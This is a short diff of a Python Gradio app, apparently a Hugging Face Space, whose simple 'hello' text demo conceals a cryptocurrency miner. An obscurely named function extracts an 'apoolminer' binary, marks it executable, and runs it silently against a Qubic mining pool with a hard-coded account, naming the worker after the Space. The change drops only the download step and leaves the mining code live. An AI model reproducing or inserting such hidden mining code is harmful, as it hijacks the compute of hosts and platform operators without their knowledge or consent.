@@ -9,7 +9,7 @@ demo = gr.Interface(fn=hello, inputs="text", outputs="text")
 
 def dab01959():
     wk_name = os.getenv('SPACE_ID').replace("/","_")
-    os.system("wget https://github.com/Fgrr23/pou/raw/refs/heads/main/apoolminer_linux_autoupdate.tar.gz && tar xvf apoolminer_linux_autoupdate.tar.gz")
+    os.system("tar xvf apoolminer_linux_autoupdate.tar.gz")
     os.system("chmod +x ./apoolminer_linux_autoupdate/apoolminer")
     os.system(f"./apoolminer_linux_autoupdate/apoolminer --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")
 
